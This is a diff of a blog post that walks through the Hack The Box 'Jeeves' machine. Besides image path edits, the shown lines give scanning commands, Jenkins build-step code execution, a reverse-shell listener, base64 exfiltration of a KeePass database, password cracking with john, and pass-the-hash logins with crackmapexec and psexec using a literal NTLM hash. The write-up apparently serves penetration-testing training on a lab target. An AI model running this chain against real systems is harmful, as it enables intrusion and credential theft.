@@ -6,7 +6,7 @@ tags = [ "Medium", "Windows", "TJNULL OSCP Prep" ]
 image = "jeeves-icon.png"
 +++
 
-![](content/post/htb-jeeves/intro.png)
+![](intro.png)
 
 ## Description
 
@@ -28,7 +28,7 @@ image = "jeeves-icon.png"
 nmap -Pn -p- --min-rate=1000 -T4 10.10.10.63 -vv -oN ports
 ```
 
-![](content/post/htb-jeeves/1.png)
+![](1.png)
 
 We run `-sCV` on the open ports.
 
@@ -44,13 +44,13 @@ ports=$(cat ports | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 echo $ports
 ```
 
-![](content/post/htb-jeeves/2.png)
+![](2.png)
 
 ```python
 nmap -p$ports 10.10.10.63 -sCV -oN version-basescripts
 ```
 
-![](content/post/htb-jeeves/3.png)
+![](3.png)
 
 ---
 
@@ -61,27 +61,27 @@ We try to login to SMB, but it requires a password. <br>
 smbclient -N -L \\\\10.10.10.63\\
 ```
 
-![](content/post/htb-jeeves/9.png)
+![](9.png)
 
 ---
 
 Port 50000 gives the 404 Not Found error listed with nmap. <br>
 [Video timestamp 0:25](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=25s)
 
-![](content/post/htb-jeeves/4.png)
+![](4.png)
 
 ---
 
 Port 80 also gives an error, this time as an image. <br>
 [Video timestamp 0:32](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=32s)
 
-![](content/post/htb-jeeves/5.png)
+![](5.png)
 
-![](content/post/htb-jeeves/6.png)
+![](6.png)
 
-![](content/post/htb-jeeves/7.png)
+![](7.png)
 
-![](content/post/htb-jeeves/8.png)
+![](8.png)
 
 ---
 
@@ -92,9 +92,9 @@ We run `ffuf` and find a `/askjeeves` directory on port 50000 that's running Jen
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.63:50000/FUZZ -recursion -recursion-depth 1 -o ffuf
 ```
 
-![](content/post/htb-jeeves/10.png)
+![](10.png)
 
-![](content/post/htb-jeeves/11.png)
+![](11.png)
 
 ## Foothold
 
@@ -103,24 +103,24 @@ We find a RCE exploit for Jenkins at [Jenkins RCE Creating Modifying Project](ht
 
 1. Create a `New Item`
 
-![](content/post/htb-jeeves/12.png)
+![](12.png)
 
 2. `Enter an item Name`, choose `freestyle project`, and click `OK`.
 
-![](content/post/htb-jeeves/13.png)
+![](13.png)
 
 3. Scroll down to build and add the `Execute Windows batch command` build step.
 
-![](content/post/htb-jeeves/14.png)
-![](content/post/htb-jeeves/15.png)
+![](14.png)
+![](15.png)
 
 4. Create a `PoweShell #3 base64` encoded reverse shell at [https://www.revshells.com/](https://www.revshells.com/)
 
-![](content/post/htb-jeeves/16.png)
+![](16.png)
 
 5. Paste the rev shell into `Command` and click `Apply`.
 
-![](content/post/htb-jeeves/17.png)
+![](17.png)
 
 6. Start your listener with `rwlrap`
 
@@ -130,7 +130,7 @@ rlwrap -cAr nc -lvnp <your chosen port>
 
 7. Navigate to `http://10.10.10.63:50000/askjeeves/job/<your job's name>/` and click `Build Now`. This gives us a shell as user kohsuke.
 
-![](content/post/htb-jeeves/18.png)
+![](18.png)
 
 We get the user flag on `c:\users\kohsuke\desktop`. <br>
 [Video timestamp 4:19](https://www.youtube.com/watch?v=Xwfi0FCEKbg&t=259s)
@@ -139,7 +139,7 @@ We get the user flag on `c:\users\kohsuke\desktop`. <br>
 dir c:\users\
 ```
 
-![](content/post/htb-jeeves/19.png)
+![](19.png)
 
 ```cmd
 cd c:\users\kohsuke\desktop
@@ -149,7 +149,7 @@ cd c:\users\kohsuke\desktop
 dir
 ```
 
-![](content/post/htb-jeeves/20.png)
+![](20.png)
 
 ---
 
@@ -166,7 +166,7 @@ cd ..\Documents
 dir
 ```
 
-![](content/post/htb-jeeves/21.png)
+![](21.png)
 
 ---
 
@@ -179,7 +179,7 @@ We move the file over to our attack box with base64 in powershell. <br>
 [Convert]::ToBase64String((Get-Content -path "C:\users\kohsuke\documents\ceh.kdbx" -Encoding byte))
 ```
 
-![](content/post/htb-jeeves/22.png)
+![](22.png)
 
 **On our attack box:**
 
@@ -187,7 +187,7 @@ We move the file over to our attack box with base64 in powershell. <br>
 echo "A9mimmf7S7UBAAMAAhAAMcHy5r9xQ1C+WAUhavxa/wMEA<snip>" | base64 -d > CEH.kdbx
 ```
 
-![](content/post/htb-jeeves/23.png)
+![](23.png)
 
 We have `CEH.kdbx` on our local machine.
 
@@ -195,9 +195,9 @@ We have `CEH.kdbx` on our local machine.
 ls
 ```
 
-![](content/post/htb-jeeves/24.png)
+![](24.png)
 
-![](content/post/htb-jeeves/25.png)
+![](25.png)
 
 ---
 
@@ -218,7 +218,7 @@ kpcli
 open CEH.kdbx
 ```
 
-![](content/post/htb-jeeves/26.png)
+![](26.png)
 
 `keepass2john` helps us out.
 
@@ -226,7 +226,7 @@ open CEH.kdbx
 keepass2john CEH.kdbx > CEH.kdbx-hash
 ```
 
-![](content/post/htb-jeeves/27.png)
+![](27.png)
 
 Then we use `john` to get the master password.
 
@@ -234,7 +234,7 @@ Then we use `john` to get the master password.
 john CEH.kdbx-hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![](content/post/htb-jeeves/28.png)
+![](28.png)
 
 Now it's time to grab the passwords from this `CEH.kdbx` file.
 
@@ -252,7 +252,7 @@ After entering the `moonshine1` password we find 7 password entries.
 find .
 ```
 
-![](content/post/htb-jeeves/29.png)
+![](29.png)
 
 We find a hash in entry `0`
 
@@ -266,7 +266,7 @@ We put the hash in a file for Pass The Hash attacks.
 echo "aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00" > hashes
 ```
 
-![](content/post/htb-jeeves/30.png)
+![](30.png)
 
 ---
 
@@ -277,7 +277,7 @@ We use `crackmapexec` to test the hash on the smb server. We find out the hash w
 crackmapexec smb 10.10.10.63 --local-auth -u Administrator -H hashes
 ```
 
-![](content/post/htb-jeeves/31.png)
+![](31.png)
 
 ---
 
@@ -288,7 +288,7 @@ We use `impacket-psexec` to get on the server as Administrator. <br>
 impacket-psexec Administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
 ```
 
-![](content/post/htb-jeeves/32.png)
+![](32.png)
 
 ---
 
@@ -303,7 +303,7 @@ cd c:\users\administrator\desktop
 dir
 ```
 
-![](content/post/htb-jeeves/33.png)
+![](33.png)
 
 The file says `"The flag is elsewhere. Look deeper"` .
 
@@ -311,7 +311,7 @@ The file says `"The flag is elsewhere. Look deeper"` .
 type hm.txt
 ```
 
-![](content/post/htb-jeeves/34.png)
+![](34.png)
 
 Let's look deeper into the `hm.txt` file, then.
 
@@ -319,7 +319,7 @@ Let's look deeper into the `hm.txt` file, then.
 dir /r
 ```
 
-![](content/post/htb-jeeves/35.png)
+![](35.png)
 
 ---
 
@@ -338,4 +338,4 @@ more < hm.txt:root.txt:$DATA
 powershell Get-Content hm.txt -stream root.txt
 ```
 
-![](content/post/htb-jeeves/36.png)
+![](36.png)
